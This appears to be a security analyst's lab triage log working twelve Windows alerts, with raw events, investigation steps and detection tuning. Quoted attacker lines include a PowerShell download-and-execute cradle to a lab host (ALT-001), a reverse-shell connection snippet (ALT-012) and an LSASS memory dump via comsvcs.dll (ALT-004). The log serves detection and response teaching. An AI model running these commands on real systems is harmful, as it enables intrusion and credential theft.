# 06 - Alert Triage Log

Twelve alerts worked end to end. Eight true positives, four false positives.

This is the file that shows how I think. The false positives are in here on purpose, because a triage log with no false positives in it is not a real triage log, it is a highlight reel.

---

## Format

Every entry records the same things. Alert, what I checked, what I found, what I checked that was clean, disposition, and how long it took.

The clean checks are written down deliberately. Most tickets only record what was wrong, which means the next analyst repeats every negative result.

---

## ALT-001

| | |
| --- | --- |
| **Alert** | SOC-1008 rule 100801, Office application spawned a command interpreter |
| **Level** | 14 |
| **Detected** | 2026-08-12 14:02:13 UTC |
| **Host** | WS11-01 (10.20.10.51) |
| **User** | `VBUNNYLAB\vbunny` |
| **Triaged** | 14:04, time to triage 3 minutes |
| **Disposition** | **True positive**, escalated |

### Raw event

```text
Sysmon Event ID 1
ParentImage:  C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentProcessId: 2180
Image:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ProcessId:    3204
CommandLine:  powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUA...
User:         VBUNNYLAB\vbunny
IntegrityLevel: Medium
```

### What I did

**1. Read the parent.** `WINWORD.EXE`. Word has no legitimate reason to launch PowerShell. That alone was enough to treat this as real rather than a rule misfire.

**2. Decoded the command.** Checked PowerShell 4104 first, which had the deobfuscated block already.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.20.99.10:8080/u.ps1')
```

Downloading a script and executing it in memory. `10.20.99.10` is not a corporate address.

**3. Checked the destination.** 10.20.99.0/24 is the segment corporate hosts are explicitly blocked from reaching. Firewall rule 2 logged the attempt. An internal host trying to reach that range is unambiguous.

**4. Walked the tree forward.** PID 3204 spawned PID 4812, also PowerShell. Sysmon 3 showed PID 3204 connecting outbound to 10.20.99.10:8080 at 14:02:19.

**5. Walked the tree backward.** `WINWORD.EXE` PID 2180, parent `explorer.exe`. The user opened a document.

**6. Found the document.** Sysmon 11 showed `Q3-Invoice-Review.docm` written to Downloads at 13:58:02, and Sysmon 15 recorded a Zone.Identifier stream on it, meaning it came from outside the machine.

### Clean checks

- No other host in the estate had executed the same command line
- No other host had contacted 10.20.99.10
- Defender was healthy and had not been modified at the time of this alert
- `vbunny` held no privileged group membership
- No scheduled task or service created at this point in the timeline

### Escalated

14:09. Criteria met: parent was an Office application, outbound connection to a non-corporate address, and a download cradle in the decoded content.

Became incident **IR-2026-014**.

### Note

This alert was the whole incident, ten minutes before anything was stolen. Everything that followed was downstream of this one event. If this had been worked and contained at 14:04, stages 4 through 7 would not have happened.

---

## ALT-002

| | |
| --- | --- |
| **Alert** | SOC-1004 rule 100402, autorun value pointing at user-writable path |
| **Level** | 12 |
| **Detected** | 2026-08-12 14:03:45 UTC |
| **Host** | WS11-01 |
| **User** | `VBUNNYLAB\vbunny` |
| **Triaged** | 14:12, time to triage 9 minutes |
| **Disposition** | **True positive**, linked to IR-2026-014 |

### Raw event

```text
Sysmon Event ID 13
TargetObject: HKU\S-1-5-21-...\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OneDriveSync
Details:      C:\Users\vbunny\AppData\Roaming\Microsoft\od.ps1
Image:        C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ProcessId:    4812
```

### What I did

**1. Read the value, not the name.** The name `OneDriveSync` is designed to look like Microsoft. The value points at `AppData\Roaming\Microsoft\od.ps1`. Real OneDrive runs from `C:\Program Files` or `%LOCALAPPDATA%\Microsoft\OneDrive\OneDrive.exe`. This is neither.

**2. Checked the file.** `od.ps1` existed, written at 14:03:41 by PID 4812. 2.1 KB. Contents were a beacon loop with a 60 second sleep, contacting `http://10.20.99.10:8080/c`.

**3. Traced the creating process.** PID 4812 parent was PID 3204, parent `WINWORD.EXE` PID 2180. Same tree as ALT-001.

**4. Searched the estate.** No other host had a Run value named `OneDriveSync` or a file named `od.ps1`.

### Clean checks

- The genuine OneDrive Run entry was present, unmodified, and pointing at the correct path
- No other autorun locations modified on this host
- Startup folders on both the user and machine were clean
- No scheduled task or service created at this point

### Disposition

Linked to IR-2026-014 rather than raised separately. Same process tree, same intrusion.

### Note

I did not delete the Run key. It was documented, the file was copied for analysis, and removal waited for the eradication phase. Deleting persistence while an investigation is running destroys evidence and leaves the access that created it untouched.

---

## ALT-003

| | |
| --- | --- |
| **Alert** | SOC-1001 rule 100104, successful logon following a password spray |
| **Level** | 14 |
| **Detected** | 2026-08-12 14:08:14 UTC |
| **Host** | DC01 |
| **Source** | 10.20.10.51 (WS11-01) |
| **Triaged** | 14:10, time to triage 2 minutes |
| **Disposition** | **True positive**, linked to IR-2026-014 |

### What I did

**1. Counted the failures.** 24 distinct accounts failed from 10.20.10.51 between 14:07:33 and 14:08:09. 36 seconds.

**2. Read the SubStatus codes.** 21 were `0xC000006A`, wrong password on a real account. 3 were `0xC0000064`, account does not exist. A partial but mostly accurate user list.

**3. Checked the source.** 10.20.10.51 is WS11-01, the host from ALT-001. This was not an external spray, it was the compromised workstation spraying the domain from inside.

**4. Found the success.** 4624 at 14:08:11, account `svc_backup`, logon type 3, source 10.20.10.51.

**5. Checked what `svc_backup` did next.** 5140 share access on DC01, then at 14:11:19 an authentication from `svc_backup` to WS11-02.

**6. Checked privilege.** `svc_backup` was a member of `Backup Operators`. That group can read any file on a domain controller, including `ntds.dit`.

### Clean checks

- No other source address sprayed in the window
- `vampiricbunny` and `breakglass` were both targeted and both failed
- No privileged group membership changes at this point
- No Kerberos ticket anomalies on DC01

### Escalated

14:13. A spray from an internal host with a confirmed success on a privileged service account.

### Note

`svc_backup` had the password `Summer2025!`. Twelve characters, upper, lower, digit, symbol. It passes every complexity policy Windows can enforce, and it died to a spray in 36 seconds.

Complexity rules do not produce strong passwords. Length and a breached-password check do. This is the single clearest lesson in the whole exercise.

---

## ALT-004

| | |
| --- | --- |
| **Alert** | SOC-1007 rules 100703 and 100704, LSASS dump via comsvcs.dll |
| **Level** | 14 |
| **Detected** | 2026-08-12 14:15:02 UTC |
| **Host** | WS11-02 (10.20.10.52) |
| **User** | `VBUNNYLAB\svc_backup` |
| **Triaged** | 14:15, time to triage under 1 minute |
| **Disposition** | **True positive**, linked to IR-2026-014 |

### Raw event

```text
Sysmon Event ID 10
SourceImage:   C:\Windows\System32\rundll32.exe
TargetImage:   C:\Windows\System32\lsass.exe
GrantedAccess: 0x1410
CallTrace:     C:\Windows\SYSTEM32\ntdll.dll+9d234|UNKNOWN(00007FFE1C2A0000)
```

### What I did

**1. Read GrantedAccess.** `0x1410` is query plus read virtual memory. A memory read, not enumeration.

**2. Read CallTrace.** `UNKNOWN` in the stack. The call originated from memory not backed by a file on disk.

**3. Read the command line.** Sysmon 1 for the same PID:

```text
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\o.bin full
```

PID 712 was LSASS. Named `.bin`, not `.dmp`.

**4. Confirmed the dump succeeded.** Sysmon 11 showed `C:\Users\Public\o.bin` written at 14:15:01, 54 MB.

**5. Established exposure.** Every account that had logged on to WS11-02 in 30 days:

| Account | Logon types | Privileged |
| --- | --- | :---: |
| `m.calloway` | 2, 11 | No |
| `svc_backup` | 3 | Yes, Backup Operators |
| `vampiricbunny` | 10 | **Yes, Domain Admin** |

`vampiricbunny` had an RDP session to WS11-02 six days earlier. A domain administrator credential was in that memory.

**6. Isolated immediately.** Network isolation at the switch. Did not reboot.

### Clean checks

- `o.bin` had not been transferred off the host at the time of isolation, confirmed against Sysmon 3 and firewall logs
- No other host showed LSASS access in the window
- No `ntds.dit` access on DC01
- No DCSync, no 4662 with replication GUIDs

### Escalated

14:16, one minute. Credential access is escalated immediately with no exception.

### Note

Two mistakes on my side are worth recording. The exclusion for `C:\Users\Public` had been added by rule SOC-1009 at 14:13:47, two minutes before this, and I had not worked that alert yet. It was sitting in the queue. Working alerts strictly by severity meant the level 13 Defender alert waited while lower severity alerts ahead of it got attention.

And the file was named `.bin`. If my rule had keyed on the extension it would have missed. It keyed on the handle to LSASS instead, which is the thing the technique cannot avoid.

---

## ALT-005

| | |
| --- | --- |
| **Alert** | SOC-1003 rule 100302, PowerShell download cradle |
| **Level** | 10 |
| **Detected** | 2026-08-14 09:22:07 UTC |
| **Host** | WS11-01 |
| **User** | `VBUNNYLAB\vbunny` |
| **Triaged** | 09:31, time to triage 9 minutes |
| **Disposition** | **False positive**, rule tuned |

### Raw event

```text
CommandLine: powershell.exe -ExecutionPolicy Bypass -Command
             "Invoke-WebRequest -Uri 'https://download.notepad-plus-plus.org/...' -OutFile ..."
ParentImage: C:\Program Files (x86)\PDQ\PDQDeployRunner\service-1\PDQDeployRunner-1.exe
```

### What I did

**1. Read the parent.** PDQ Deploy runner. Software deployment, not an Office application.

**2. Checked the change calendar.** A Notepad++ deployment was scheduled for 09:20 that morning. Ten minutes earlier than the alert, consistent with a staged rollout.

**3. Verified the URL.** `download.notepad-plus-plus.org`, the vendor's own domain, over HTTPS.

**4. Checked the file.** Hash matched the vendor's published signature. Digitally signed, valid certificate.

**5. Checked whether it was scoped.** Same alert on three other hosts in the same window, all with the PDQ parent, all in the deployment target collection.

### Clean checks

- No encoding, no hidden window
- Destination was a vendor domain, not an IP address
- No persistence created by the process
- No other activity from the process tree

### Disposition

False positive. Legitimate software deployment.

### Rule change

I did not exclude PDQ broadly. That would create a blind spot an attacker reaches by running through the deployment tool, which is a real technique.

The tuning was narrower. The rule now requires the download destination to be something other than an allowlisted vendor domain when the parent is a known deployment agent. A download cradle from PDQ to an arbitrary address still fires.

### Note

Step 2 resolved this alert. Checking the change calendar first would have saved eight of the nine minutes. It is now step 4 of the universal first steps in the playbooks, and it is there because of this ticket.

---

## ALT-006

| | |
| --- | --- |
| **Alert** | SOC-1001 rule 100103, password spray |
| **Level** | 12 |
| **Detected** | 2026-08-15 08:04:51 UTC |
| **Host** | DC01 |
| **Source** | 10.20.10.20 (FS01) |
| **Triaged** | 08:11, time to triage 7 minutes |
| **Disposition** | **False positive**, rule tuned |

### What I did

**1. Counted.** 9 distinct accounts, 4 minutes, all from FS01.

**2. Read the SubStatus codes.** All `0xC000006A`, wrong password.

**3. Read the logon type.** All type 3, network.

**4. Looked at the timing.** 08:00 to 08:08 on a weekday morning. That is the start of the working day, when everybody connects to the file server at once.

**5. Worked out the mechanism.** FS01 was relaying SMB session setup attempts. Users with stale cached credentials on mapped drives were failing against the file server, and the failures were logging with FS01 as the source rather than the individual workstations.

**6. Confirmed against the previous week.** Same pattern every weekday morning between 07:55 and 08:15. Never outside that window. Never on a weekend.

### Clean checks

- No successful logon from FS01 in the window other than normal file access
- No privileged account among the 9
- The same 9 accounts had successful logons within minutes of their failures
- No process creation on FS01 consistent with a spray tool

### Disposition

False positive. Normal morning authentication churn, aggregated by the file server.

### Rule change

FS01 excluded as a source, and the threshold raised from 5 to 8 distinct accounts.

Recorded in the rule comments with the reason, because an undocumented exclusion becomes a mystery blind spot in six months.

### Note

The daily periodicity is what settled it. An attack does not run only between 07:55 and 08:15 on weekdays. Checking whether a pattern repeats on a schedule is one of the fastest ways to separate normal from malicious, and it takes about two minutes.

---

## ALT-007

| | |
| --- | --- |
| **Alert** | SOC-1006 rule 100602, service installed with a suspicious image path |
| **Level** | 13 |
| **Detected** | 2026-08-16 22:14:33 UTC |
| **Host** | FS01 |
| **User** | `NT AUTHORITY\SYSTEM` |
| **Triaged** | 22:19, time to triage 5 minutes |
| **Disposition** | **False positive** |

### Raw event

```text
System Event ID 7045
ServiceName: VeeamDeploymentService
ImagePath:   C:\Windows\VeeamVssSupport\VeeamDeploymentSvc.exe
ServiceType: user mode service
StartType:   auto start
```

### What I did

**1. Checked the change calendar.** A Veeam backup job was scheduled at 22:00. The alert was 14 minutes into the window.

**2. Checked the binary.** Digitally signed by Veeam Software Group GmbH, valid chain, valid timestamp.

**3. Checked the hash.** Clean on reputation, known Veeam component.

**4. Checked the pattern.** The same service had been installed and removed 23 times in 30 days, always between 22:00 and 22:30, always on backup nights. Veeam deploys a transient service to perform the backup and removes it afterwards.

**5. Checked what it did.** Read the shares it was meant to read. No lateral movement, no credential access, no outbound connection to anything but the backup repository.

### Clean checks

- Signed and verified
- Removed cleanly at 22:41, consistent with previous runs
- No other service installed on FS01 in the window
- No process spawned by the service other than expected Veeam components

### Disposition

False positive. Legitimate backup software behaviour.

### Rule change

None. I considered excluding `VeeamDeploymentService` by name and decided against it.

The service name is attacker-controllable. Anyone who reads this documentation, or simply guesses, can name their service `VeeamDeploymentService` and inherit the exclusion. One alert a night that takes two minutes to clear is cheaper than a blind spot with a publicly guessable name.

### Note

This is a judgement call and I would defend it in either direction. In a larger environment with nightly backups on 200 servers, 200 alerts a night is not sustainable and the correct answer changes. The right exclusion there would be by binary hash and signing certificate, not by service name, because the attacker cannot forge the signature.

---

## ALT-008

| | |
| --- | --- |
| **Alert** | SOC-1002 rule 100203, Kerberoasting at scale |
| **Level** | 13 |
| **Detected** | 2026-08-17 11:47:22 UTC |
| **Host** | DC01 |
| **User** | `VBUNNYLAB\m.calloway` |
| **Triaged** | 11:49, time to triage 2 minutes |
| **Disposition** | **True positive**, authorised activity |

### What I did

**1. Counted.** 11 distinct service names, RC4 encryption, 14 seconds. No application behaves like that.

**2. Checked the requesting account.** `m.calloway`, standard user, no reason to request service tickets for 11 services.

**3. Checked what ran.** Sysmon 1 on WS11-02 showed:

```text
powershell.exe -ExecutionPolicy Bypass -File C:\Tools\Rubeus-check.ps1
```

**4. Checked the change calendar.** An internal security assessment was scheduled for that day, 11:00 to 15:00.

**5. Confirmed with the assessment scope.** Kerberoasting was in scope and the source host was listed.

### Clean checks

- No ticket for `krbtgt`
- No offline cracking traffic, no outbound transfer of the tickets
- No privileged group changes
- No authentication using any of the enumerated service accounts afterwards

### Disposition

True positive, authorised. The technique genuinely occurred and the detection worked correctly. It was sanctioned activity.

### Note

This is worth distinguishing from a false positive, and people conflate the two constantly.

A false positive means the detection was wrong. This detection was right. Kerberoasting happened, the rule caught it in 22 seconds, and it was authorised.

Closing this as a false positive would have been a mistake, because it would suggest the rule needs tuning. It does not. The rule performed exactly as designed against a real technique, which is the best possible evidence that it works.

The assessment also confirmed something useful: `svc_sql` had an RC4-crackable ticket and a password that fell in under four minutes offline. That went into the recommendations as an AES-only enforcement item.

---

## ALT-009

| | |
| --- | --- |
| **Alert** | SOC-1009 rule 100901, Defender configuration modified |
| **Level** | 13 |
| **Detected** | 2026-08-18 16:02:11 UTC |
| **Host** | WS11-01 |
| **User** | `VBUNNYLAB\vampiricbunny` |
| **Triaged** | 16:05, time to triage 3 minutes |
| **Disposition** | **False positive**, my own activity |

### What I did

**1. Read the command.**

```powershell
Add-MpPreference -ExclusionPath 'C:\AtomicRedTeam'
```

**2. Checked the account.** `vampiricbunny`, domain admin, which is my own administrative account.

**3. Checked the time.** 16:02, during a scheduled detection validation window.

**4. Confirmed against my own notes.** I had added the exclusion to allow Atomic Red Team tests to execute rather than being blocked at write time.

### Disposition

False positive. Authorised, by me, during testing.

### Note

I am including this because it is a real failure mode and it is instructive.

I generated an alert, then triaged my own alert, and it took three minutes to resolve something I had done myself twelve minutes earlier.

In a real SOC this is the change management problem in miniature. Work that generates alerts has to be announced before it starts, or analysts burn time investigating their own colleagues. The fix is procedural, not technical: a notification to the queue before testing begins, with the host, the window, and the expected alerts.

It also confirms the rule works on a privileged account, which is worth knowing. Plenty of monitoring quietly excludes administrators, and administrators are exactly who an attacker wants to become.

---

## ALT-010

| | |
| --- | --- |
| **Alert** | SOC-1005 rule 100503, scheduled task created from a command shell |
| **Level** | 12 |
| **Detected** | 2026-08-19 03:11:47 UTC |
| **Host** | WS11-02 |
| **User** | `NT AUTHORITY\SYSTEM` |
| **Triaged** | 08:14, time to triage 5 hours 3 minutes |
| **Disposition** | **False positive** |

### What I did

**1. Read the task.**

```text
TaskName: \Microsoft\Windows\UpdateOrchestrator\Reboot_AC
Author:   Microsoft Corporation
Action:   %systemroot%\system32\MusNotification.exe
Parent:   svchost.exe -k netsvcs -p -s Schedule
```

**2. Checked the path.** `\Microsoft\Windows\UpdateOrchestrator\`. That is a Windows-owned path and a user cannot create tasks there without SYSTEM.

**3. Checked the binary.** `MusNotification.exe`, signed by Microsoft, in `System32`.

**4. Checked the time.** 03:11, inside the maintenance window. Windows Update had installed patches that night.

**5. Confirmed across hosts.** The same task appeared on WS11-01 at 03:09 and on FS01 at 03:22. Consistent with a patch cycle, not with an attacker.

### Clean checks

- Signed Microsoft binary in a protected directory
- Task path owned by Windows
- Matching update install events in the Setup log
- No other task creation on any host in the window

### Disposition

False positive. Windows Update creating its own reboot task.

### Rule change

Excluded tasks created under `\Microsoft\Windows\` where the parent is `svchost.exe` and the action binary is signed by Microsoft and sits in `System32`.

Three conditions together, not one. Path alone is not enough because a SYSTEM-level attacker can write there.

### Note

Five hours to triage, and that is the finding.

This fired at 03:11 and was worked at 08:14 because nobody was on shift. In a 24/7 SOC it would have been worked in minutes. In a lab, and in plenty of small businesses, overnight alerts wait for morning.

That gap is worth stating honestly. The detection latency was 11 seconds. The response latency was five hours. Detection latency is the number people quote and response latency is the number that determines outcomes.

---

## ALT-011

| | |
| --- | --- |
| **Alert** | SOC-1010 rule 101001, member added to a privileged group |
| **Level** | 14 |
| **Detected** | 2026-08-20 10:33:09 UTC |
| **Host** | DC01 |
| **User** | `VBUNNYLAB\vampiricbunny` |
| **Triaged** | 10:34, time to triage 1 minute |
| **Disposition** | **True positive**, authorised activity |

### What I did

**1. Read the event.** 4732, `m.calloway` added to `Backup Operators` by `vampiricbunny`.

**2. Checked the change calendar.** A change record existed, approved, scheduled for that morning. `m.calloway` was taking over backup administration.

**3. Checked the group.** `Backup Operators` can read any file on a domain controller, including the AD database. It is a genuinely privileged group even though the name sounds operational.

**4. Checked the account.** `m.calloway` had not been in any privileged group before this.

**5. Checked for anything else.** No other group changes, no logon anomalies, no activity from the account outside normal hours.

### Clean checks

- Change record present and approved before the change
- Only one member added, only one group
- No add-then-remove pattern
- The performing account was the expected administrator

### Disposition

True positive, authorised. Real privileged group change, correctly detected, legitimately performed.

### Note

One minute to triage, because the change record existed and was easy to find.

That is the whole argument for change management from a SOC perspective. The same event with no change record is a potential domain compromise and takes an hour of phone calls to resolve. With the record it takes sixty seconds.

I also flagged something the change did not cover. `Backup Operators` membership was granted permanently when the task was periodic. Recommended converting it to a time-bound assignment, which limits the window in which stealing that credential is useful.

---

## ALT-012

| | |
| --- | --- |
| **Alert** | SOC-1003 rule 100303, hidden-window encoded PowerShell |
| **Level** | 14 |
| **Detected** | 2026-08-21 13:55:02 UTC |
| **Host** | WS11-01 |
| **User** | `VBUNNYLAB\vbunny` |
| **Triaged** | 13:56, time to triage 1 minute |
| **Disposition** | **True positive**, contained |

### Raw event

```text
CommandLine:  powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA...
ParentImage:  C:\Windows\System32\wscript.exe
ParentCommandLine: wscript.exe C:\Users\vbunny\AppData\Local\Temp\invoice.js
```

### What I did

**1. Read the parent.** `wscript.exe` running a `.js` file from Temp. That is a script-based delivery chain.

**2. Decoded.** From 4104:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.20.99.10',4444)
$stream = $client.GetStream()
...
```

A reverse shell. Not a downloader, a direct interactive connection.

**3. Checked whether it connected.** Sysmon 3 showed an outbound attempt to 10.20.99.10:4444 at 13:55:03. Firewall rule 2 blocked it and logged it.

**4. Confirmed the block.** No established session. The connection never completed.

**5. Found the origin.** `invoice.js` written to Temp at 13:54:47 by `outlook.exe`. An email attachment, opened by the user.

**6. Killed the process and isolated the host.** 13:57.

### Clean checks

- The reverse shell never established, confirmed against firewall state and Sysmon 3
- No persistence created
- No credential access
- No other host received the same attachment, confirmed by message trace
- No lateral movement from WS11-01

### Disposition

True positive, contained before impact.

### Note

The firewall rule stopped this, not the detection. Rule 2 blocks corporate to red and it blocked the callback.

That is the layered defence argument in one ticket. The detection told me it happened. The segmentation stopped it working. Either alone would have been worse, and the segmentation was the part that actually prevented harm.

Also worth noting: the block is why triage took one minute. A reverse shell that never connected has no post-exploitation activity to investigate. Containment that happens automatically makes triage faster, which frees the analyst for the alerts that need thinking.

---

## Summary

| ID | Alert | Level | Disposition | Time to triage |
| --- | --- | :---: | --- | --- |
| ALT-001 | Office spawned shell | 14 | True positive, escalated | 3 min |
| ALT-002 | Run key persistence | 12 | True positive | 9 min |
| ALT-003 | Spray then success | 14 | True positive, escalated | 2 min |
| ALT-004 | LSASS dump | 14 | True positive, escalated | under 1 min |
| ALT-005 | Download cradle | 10 | False positive, tuned | 9 min |
| ALT-006 | Password spray | 12 | False positive, tuned | 7 min |
| ALT-007 | Service installation | 13 | False positive, no change | 5 min |
| ALT-008 | Kerberoasting | 13 | True positive, authorised | 2 min |
| ALT-009 | Defender modified | 13 | False positive, own activity | 3 min |
| ALT-010 | Scheduled task | 12 | False positive, tuned | 5 h 3 min |
| ALT-011 | Privileged group change | 14 | True positive, authorised | 1 min |
| ALT-012 | Reverse shell | 14 | True positive, contained | 1 min |

**Eight true positives, four false positives.** Of the eight true positives, two were authorised activity that the detections correctly caught.

Median time to triage, excluding the overnight alert: **3 minutes**.

### What the log shows about the process

Three things separate the fast tickets from the slow ones.

**The change calendar.** ALT-005, ALT-008, ALT-010 and ALT-011 were all resolved by it. ALT-011 took a minute because the record was there. ALT-005 took nine because I checked it fifth instead of first.

**Reading the parent process.** ALT-001, ALT-005 and ALT-012 were all decided by the parent within the first minute. Word means compromise. PDQ means deployment. `wscript.exe` from Temp means delivery chain. The command line is interesting, the parent is decisive.

**Periodicity.** ALT-006, ALT-007 and ALT-010 were all resolved by asking whether the pattern repeats on a schedule. Attacks do not run every weekday at 08:00, or every backup night at 22:14. That question takes two minutes and it settles a whole category of alerts.

---

Next: [07-Incident-Report.md](07-Incident-Report.md)
